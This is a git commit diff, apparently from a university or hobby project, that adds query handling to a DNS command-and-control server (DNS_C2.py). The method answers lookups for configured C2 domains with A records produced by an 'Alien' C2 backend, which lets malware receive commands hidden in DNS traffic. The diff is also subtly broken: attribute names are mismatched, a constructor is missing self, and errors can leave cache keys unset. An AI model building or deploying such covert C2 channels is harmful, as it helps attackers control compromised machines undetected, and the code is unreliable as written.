c2d16b34aba2f5b5bc503d19eb2308bfec88173e
SergeevGeorge <sergeevgeorge@k733.edu>
2022-12-05 20:33:28 +0300

    process_query for DnsServer is done

--- server/DNS_C2.py
+++ server/DNS_C2.py
@@ -1,15 +1,65 @@
 import logging
+import traceback
+import sys
 from socketserver import BaseRequestHandler, ThreadingUDPServer
+
+from dnslib import QTYPE, RR, A, DNSHeader, DNSRecord
 
 from Alien import alien
 
 logger = logging.getLogger("DNS_C2")
 
+TTL = 86400
+
 class DnsServer:
-    def __init__(self, c2_server: alien, c2_domains: list[str]):
+    def __init__(self, c2_server, c2_domains):
         self.c2_server = c2_server
         self.c2_domain = c2_domains
         self.memory = {}
+    def process_query(self, data):
+        request = DNSRecord.parse(data)
+        reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
+        qname = str(request.q.qname)
+
+        if qname.endswith("."):
+            qname = qname[:-1]
+
+        if not any(domain in qname for domain in self.c2_domains):
+            return None
+
+        logger.debug(msg=f"[DNS] QUERY: {qname}")
+
+        from_cache = True
+        if qname not in self.memory.keys():
+            try:
+                from_cache = False
+                self.memory[qname] = self.c2_server.parse_dns_request(qname)
+            except Exception:
+                traceback.print_exc(file=sys.stderr)
+
+        response_string = self.memory[qname]
+        if response_string is None:
+            return None
+
+        cache_string = " (cached)" if from_cache else ""
+
+        logger.debug(
+            msg=f"[DNS] RESPONSE: {response_string} {cache_string}"
+        )
+
+        a_record = A(response_string)
+        reply.add_answer(
+            RR(
+                rname=qname,
+                rtype=QTYPE.A,
+                rclass=1,
+                ttl=TTL,
+                rdata=a_record,
+            )
+        )
+
+        return reply.pack()
+    
 
 class UdpRequestHandler(BaseRequestHandler):
     def __init__():
